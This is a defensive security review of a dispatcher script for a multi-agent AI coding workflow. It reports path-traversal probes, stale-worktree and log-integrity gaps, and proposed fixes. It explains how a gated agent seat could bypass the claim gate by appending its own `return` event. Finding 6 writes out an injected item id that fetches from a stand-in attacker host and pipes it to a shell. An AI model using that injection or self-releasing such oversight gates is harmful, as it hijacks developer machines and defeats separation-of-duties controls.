**Reviewer:** Pierrot
**Date:** 2026-09-09
**Branch:** `claude/summon-team-v3-decomposed-jyiur2` at `a03259a`
**Scope:** `scripts/dispatch.mjs` and `scripts/dispatch.test.mjs`, read against `docs/methodology/team-layers.md` § The work order and § The line, `team/events.json`, and the siblings it calls: `team-log.mjs` (`appendEvent`, `readLog`), `run-checks.mjs` (`treeState`), `compose-team.mjs` (`loadTeam`). I also read `team/workflows/line.workflow.mjs` because it is the thing that will actually run `claim`, and the live `.summon/team-log.jsonl` because question 5 is about what is already in it.

**What I ran:**
- `node --test scripts/dispatch.test.mjs`: 35/35 pass, 3.8 s.
- Ten probes against the real module in throwaway git fixtures (scratchpad, cleaned up): a formation named `../../../escape`; a plan whose `worktree` says `../../pierrot-outside`; `instances.sato` set to `-1`, `0`, `"2"`, `2.5`, `true`, `null`; `open` twice across a new commit; `open` over a plain directory that is not a registered worktree; a `return` appended by hand to unlock `green`; a `return` with no `instance` field; an absolute `--order` outside root; `checks.log = ../x.jsonl`; `open --no-worktrees` outside any git repo; and `treeState` before and after appending to a git-tracked log.
- `git ls-files .summon` and `git check-ignore` on the live repo.

**Threat model for this file, said plainly.** This is a local developer tool. Every input it reads (the order, the plan, `team/*.json`, the log) is a file on the developer's own disk, and every process that can write those files can also run `git worktree add /anywhere` or `echo >> team-log.jsonl` directly. So "an attacker" here is not a remote party; it is one of three things: a seat with Bash acting beyond its brief (owner-harm C5/C8), a party or order file that arrived from somewhere else (`npx summon-team` templates, a future command that builds an order from an issue title: C7), or the developer's own typo. I have marked each finding with which of those it is real for. None of them is a remote hole, and I am not vetoing anything.

## Critical

## Important

### 1. Worktree paths are built from unvalidated seat names and trusted verbatim from the plan, so `.summon/worktrees/<instance>` is a promise the code does not keep
`scripts/dispatch.mjs:49` (`seatsOf`: `m.as ?? m.persona` and formation `f.name`, no character check anywhere, see also `compose-team.mjs:396`, `:417`), `:58-59` (`instance = \`${seat}#${i}\``, `worktree = \`${WORKTREES}/${instance}\``), `:141` (`join(root, worktree)` on the plan's `worktree` field, not recomputed from the instance), `:143` (`git worktree add --detach abs`).

Demonstrated. A party whose formation is named `../../../escape` plans cleanly (the name passes `seatsOf`, the line's station matches it) and `open` then registers a worktree at `/tmp/escape#1`, outside the fixture repo entirely. A plan file hand-edited to `worktree: "../../pierrot-outside"` registers one at `/pierrot-outside` (filesystem root; I was running as root, which is its own lesson) and the spawn event carries that path into the log verbatim. `git worktree add` will not clobber a non-empty directory, so this is not destructive; it is a write outside the boundary the spec promises (`team-layers.md:189`: "a worktree path under `.summon/worktrees/<instance>`") and `.gitignore:31` relies on.

Where it bites inside the repo without any escape: a formation named `../escape` lands the checkout at `<root>/escape#1`, which `.gitignore` does not cover, so `git status` shows a full untracked copy of the repo, `treeState` reports dirty, every receipt is invalidated, and the first seat that runs `git add -A` commits a second copy of the tree.

Honest severity: theoretical for a local tool. Whoever writes `team/parties/*.json` or `.summon/plan.json` already has the shell. It becomes real the day a party file ships in a template to someone else's machine, which is the stated plan for `summon-team`.

Fix, two lines: in `nameInstances` (or better, once in `loadTeam`/`compose` where seats are resolved) refuse a seat or formation name that does not match `/^[A-Za-z0-9_-]+$/`, and in `open` recompute the expected path from the instance (`join(root, WORKTREES, i.instance)`) and refuse a plan whose `worktree` differs from it. Then the plan cannot say something the instance name does not.

### 2. The `claim` gate keys on `return` events the seats write themselves; canon says "enforced at dispatch, before the seat runs", and that overstates it
`scripts/dispatch.mjs:166-176` (`returnedStations` releases a station on any `return` whose `instance` matches the claim's), `:188` (the log is read as truth), `:193-194` (the `order` refusal). `team/workflows/line.workflow.mjs:37` ("log your `return` event as your Log section says") and `compose-team.mjs:291` (the Log section tells every seat to append events via `team-log.mjs append`). `team-layers.md:191` ("This is the separation-of-duties boundary enforced at dispatch, before the seat runs, rather than detected ... after") versus `:146` ("until the check runner and the dispatch workflow write events from outside the model, the log is self-reported").

Demonstrated. Claim `red` for `i1`; `claim green` refuses. Append `{"seat":"tara","instance":"tara#1","event":"return","ok":true,"item":"i1"}` from a shell (any seat has one); `claim green` now writes. The seat assigned to `green` can release the constraint for itself in one command, and the `claim` event it produces looks identical to an honest one.

Which kind of hole: the spec already admits it (`:146`), and dispatch does not open a new way to write the log. What dispatch does that is new is use a self-reported event as the *input to a gate* rather than as a record, and then describe the gate as prevention. `claim` is exactly as strong as the weakest writer of `return`, and today that writer is the model being gated. The distinct-instance check (`:199`) has the same shape: it reads `claim` events, which dispatch writes, but any seat can append a `claim` too. `check --line` after the fact has the same trust base, so nothing is lost relative to before; nothing is gained either, and the sentence at `:191` implies it was.

Smallest honest mitigation, in order of cost:
1. One sentence in `team-layers.md` § The work order, after `:191`: "`claim` trusts the `return` events on the log, which the seats write themselves until the workflow writes them; the refusal is a guard against an honest out-of-order run, not against a seat that edits the log." That is the canon-level fix and it costs nothing.
2. The workflow already holds each station's result outside the model (`line.workflow.mjs:44-46`, `runStation` gets `ok`, `summary`, `emitted` back from the agent). Write the `return` from there, through a `dispatch.mjs return --plan --item --station --ok` subcommand that resolves `seat` and `instance` from the plan the same way `claim` does, and drop the "log your return" line from the prompt. Then both events the gate reads come from outside the model, which is the thing `:146` says the dispatch workflow is for. A `via` field on events is not worth adding: anyone who can append can set it.

The rest is a hook that withholds append rights to the log from seats, which is the "hook" enforcement level the composer already says belongs to `doctor`. Not this PR.

### 3. The live log is git-tracked, so every receipt is already bound to a dirty tree, and the test asserts the opposite of the repo
`.gitignore:31` ignores `.summon/worktrees/` only. `git ls-files .summon` returns `.summon/team-log.jsonl` (in three commits: `662942b`, `e38afa4`, `b932695`). `scripts/dispatch.test.mjs:171` (fixture ignores all of `.summon/`) and `:380` (asserts `tree.dirty === false` "because `.summon/` is ignored, so the log itself does not dirty the tree"). `scripts/dispatch.mjs:152` (`treeState` read once), `:159` (log appended after). `run-checks.mjs:30-34`.

Demonstrated twice. In a fixture where the log is tracked, `treeState` reads `dirty: false`, one `appendEvent`, `dirty: true`, `git status` shows ` M .summon/team-log.jsonl`. In the live repo, all four `check` events already carry `"dirty":true`. The tree binding is the integrity control ADR-0012 D8 exists for: a receipt bound to a dirty tree is supposed to mean "the code under test is not what HEAD says". Right now it means "the log exists", always, so the flag can never distinguish an honest dirty tree from its own footprint. The control is dead on arrival, and `open` is the command that guarantees it dies before the first seat runs. The test at `:380` is green because the fixture is configured differently from the repo it tests.

Part two of the same finding, question 5: the committed log carries `/home/user/summon` and `/home/user/summon/packages/summon-team` inside `check` receipts (pnpm prints the package path on failure). Dispatch's own events are clean (relative worktree path, a sha, a harness name, no hostname, no user), but they go into the same tracked file next to receipts that are the last 40 lines of whatever a bound command printed. Today that is a home directory path. The day a bound check prints an env var or a token in its failure output, it is in git history. `run-checks.mjs` owns the receipt; dispatch owns making the log mandatory (`:136`) and creating its directory (`:158`).

Fix: `.gitignore` `.summon/` (not just `worktrees/`), `git rm --cached .summon/team-log.jsonl`, and keep `.summon/plan.json` out of the tree for the same reason (the plan copies `spec` verbatim from the order, `:85`, and the spec may be text). If the log is meant to be committed as a record, that is a decision for an ADR, and then `treeState` must exclude it and receipts must be scrubbed; do not leave it half-decided. Either way, change the test's `.gitignore` fixture at `:171` to match whatever the repo actually does, so the assertion at `:380` tests the real configuration.

### 4. `open` reuses whatever is at the worktree path without checking it is a worktree at the plan's head, and reruns duplicate the spawn events
`scripts/dispatch.mjs:142` (`if (existsSync(abs)) return;`), `:152-153` (`tree` is the main repo's head, stamped on every spawn), `:156` (the comment promises a safe rerun).

Question 4, straight answer first: if `git worktree add` fails on instance 3 of 5, instances 1 and 2 exist on disk and as registered worktrees, and the log is untouched, because validation (`:154`) and worktree creation (`:157`) both precede the first append (`:159`). A rerun skips 1 and 2 and retries 3. That half is right and the tests cover the log side of it.

What the skip does not check is demonstrated in two probes. (a) `open`, commit something new, `open` again: the log gains four more spawn events (eight total, nothing refuses the duplicate) whose `tree.head` is the new commit, while the four worktrees are still detached at the old one (`worktreeHeadIsNew: false`). The instance then works on stale code and every check receipt it produces is bound to a head it never ran against, which is the precise false green D8 is meant to make impossible. (b) A plain directory at `.summon/worktrees/sato#1` (a stale checkout after `git worktree prune`, or a seat that `mkdir`'d it) is accepted, the spawn event records it as the worktree, and git has never heard of it (`registered: false`), so the seat runs in the main tree while the log says otherwise.

Honest severity: this is an integrity gap in the dispatcher's own record, reachable by ordinary use (rerun after a fix, prune, crash mid-open), not by an attacker. Important because the record is what `check`, `dissent`, and the receipts are trusted from.

Fix: in `addWorktree`, when `abs` exists, require `git -C abs rev-parse HEAD` to succeed and equal `tree.head` (pass `tree` in), else throw "stale or foreign worktree at `<path>`; `git worktree remove` it or `open` against a plan for this head". For the duplicate spawns, either refuse `open` when the log already has a `spawn` for this `order` and `instance` with no matching `return`, or accept reruns as idempotent and skip the event for an instance that is already spawned on this head. Pick one and say which in the header comment; today the comment at `:156` claims a safety the skip only half delivers.

## Suggestion

### 5. `instances` values are not validated, and memory is allocated before the concurrency check
`scripts/dispatch.mjs:56` (`order.instances[seat] ?? 1`, then a `for` loop), `:117-119` (the concurrency refusal runs after `nameInstances` has built the array). `team/events.json` `workOrder` lists `instances` as required with no type.

Demonstrated: `sato: -1` and `sato: 0` throw `TypeError: Cannot read properties of undefined (reading 'length')` from inside `assign` (a crash, not a refusal, and it names nothing); `"2"` and `2.5` coerce to two instances; `true` and `null` silently become one. `sato: 1e9` would allocate a billion-entry array before line 118 says no. This is the developer's own order file, so it is theoretical; it is also the difference between "refused, with the field named" and a stack trace. Fix in `loadOrder`: every value of `instances` must satisfy `Number.isInteger(n) && n >= 1`, and compute the total from the order before building anything.

### 6. Item ids and station names from the order are interpolated into a shell line the seat is told to run, unquoted
`scripts/dispatch.mjs:36-44` (`loadOrder` checks presence of `id`, not its shape); `team/workflows/line.workflow.mjs:31` (`--item ${item.id} --station ${st.station}` inside a bash command string). Out of scope for the file under review but the fix belongs in it. Inside `dispatch.mjs` the shell-out is clean (finding 10 below); the workflow is where a seat name or item id reaches a shell. An item id of `i1; curl attacker/x | sh` in an order does exactly what it looks like once a seat obeys "first command, before anything else". The order is the human's own file today, so theoretical; the moment a `/dispatch` command builds an order from an issue title or a board column, that string is untrusted input (C7) and this is the injection point. Fix once, in `loadOrder`: require `item.id` to match `/^[A-Za-z0-9._-]+$/` (station names come from the checked-in line and can get the same check in `loadLine` or `plan`). Then the workflow's interpolation is safe by construction, and no one has to remember to quote.

### 7. The log path from `team/checks.json` and the order/plan paths can leave the repo root
`scripts/dispatch.mjs:137` (`join(root, logPath)`), `:92` and `:149`, `:180` (`resolve(root, ...)`). Demonstrated: `checks.log = "../pierrot-escaped-log.jsonl"` writes the log one level above root; an absolute `--order` anywhere is read. Question 1, honestly: the order and plan being anywhere is by design (`team-layers.md:173`, "a JSON file, anywhere") and harmless, since they are read, not written. The log path is written to, and `review-wave.mjs:125` and `compose-team.mjs:291` share the same unchecked `join`, so all three would agree to write outside the tree. It is checked-in config that the same person controls, so this does not matter for a local tool. If you want the invariant anyway, one shared `logPathOf(root)` in `team-log.mjs` that resolves and refuses a result not under `root` costs three lines and removes two copies of the function.

### 8. A spawn outside any git repo is written with `tree: {head: null, dirty: null}` and passes validation
`scripts/dispatch.mjs:152-155`, `run-checks.mjs:30-34` (returns nulls when `git` fails), `team-log.mjs:47` (only presence of `tree` is checked). Demonstrated with `--no-worktrees` in a non-git directory: the event is written and is schema-valid. A spawn bound to no tree is a record that binds nothing; `open` should refuse when `head` is null ("not a git repository; dispatch binds every spawn to a head"), the same way it refuses a missing log. Low: `worktree` isolation already fails loudly here, so only the `--no-worktrees` path is affected.

### 9. `claim` is read-decide-append with no lock; two concurrent claims on one item can both pass
`scripts/dispatch.mjs:188` (read), `:190-201` (decide), `:205` (append). Two `claim` processes for the same item at `green` and `review` started in the same instant both see a log with neither claim and both write. Theoretical: the line workflow runs an item's stations sequentially (`line.workflow.mjs`, one pipeline per item), so the two claims that could race are never concurrent in the only caller, and `check --line` catches the result after the fact. Worth one sentence in the header comment so nobody later parallelises stations within an item and is surprised. A `flock`-style lock on the log would be the code fix if that day comes; not now.

## Clean

What I checked and found sound, against the questions asked:

- **The shell-out (question 2).** `scripts/dispatch.mjs:143` calls `spawnSync("git", ["worktree", "add", "--detach", abs], { cwd: root })`: argument array, no `shell: true`, so nothing in a seat name, instance name, or plan field is ever parsed by a shell inside this file. `abs` is always `join(root, ...)`, so it begins with the root path and cannot start with `-`; no git option injection. `treeState` in `run-checks.mjs:24-27` uses the same array form. The only string-built shell command in the neighbourhood is the workflow prompt (finding 6), not this file.
- **Where the instance name comes from.** `${seat}#${i}` at `:58`, with `seat` taken from the line's station and required to be one of the party's seats (`:100-103`); the count from the order. A seat never chooses its own instance, and `claim` takes the instance from the plan, not from the caller (`:183`, `:203`). That is the right shape; finding 1 is only about the character set of the name.
- **`--at`, `--item`, `--station`.** `at` must match the ISO regex (`team-log.mjs:20`, `:48`), and a bad one is refused before any write (`:154`). `item` and `station` must exist in the plan (`:182`, `:184`); an off-plan claim writes nothing (test `:495`).
- **Refuse-before-write.** Every refusal in `open` and `claim` is thrown before the first `appendEvent`; `open` validates all events (`:154`) before creating worktrees and before appending. The tests cover the log side of this for schema failures (`:417`), missing log (`:428`), the order constraint (`:448`), distinct-instance (`:477`), and off-plan claims (`:495`).
- **Dispatch's own events leak nothing (question 5).** A spawn carries `t`, `seat`, `instance`, `order`, `harness`, `tree: {head, dirty}`, and a relative `worktree`; a claim carries `item`, `station`, `order`. No hostname, no username, no absolute path, no environment. Error messages that include absolute paths (`readJson` at `:29`, `loadLine` at `team-log.mjs:32`, git's stderr at `:144`) go to stderr and never to the log. Everything a renderer or the site would show from dispatch is a name or a sha. The absolute paths that *are* in the committed log came from check receipts (finding 3), not from this script.
- **The `return` fallback keying.** `returnedStations` at `:171` keys on `e.instance ?? e.seat`, and a `return` that omits `instance` does not release a claim that carried one (probe P7: refused). That is the safer failure: a seat that forgets its instance id blocks the next station rather than unlocking it, and the workflow prompt tells the seat its instance (`line.workflow.mjs:32`). Worth knowing when someone reports "green is stuck".
- **The `--no-worktrees` switch.** Parsed as a bare flag (`:211`, `:219`), so it cannot swallow the next argument as a value. `parseArgs` refuses positional arguments and a switch with no value (`:218`, `:224`).
- **Licences and dependencies.** None added. `node:child_process`, `node:fs`, `node:path`, `node:url` only. Nothing for the SBOM.
- **Owner-harm lens.** C5 (destruction): `git worktree add` refuses non-empty targets and nothing in this file deletes. C6 (exfil): no network. C8 (autonomy): `open` is the only side-effecting step beyond the log, and the workflow is earn-gated behind the review station. C7 (hijack) is the finding-6 seam and is theoretical until an order is built from untrusted text.

**Verdict:** revise, no veto. Findings 1 through 4 before the dispatch half is called done; 1 and 4 are small code changes, 2 is one sentence now and a `return` subcommand next, 3 is a `.gitignore` line and a `git rm --cached` plus the test fixture agreeing with the repo. None is exploitable by anyone who does not already hold a shell on the box, and I have said so under each.
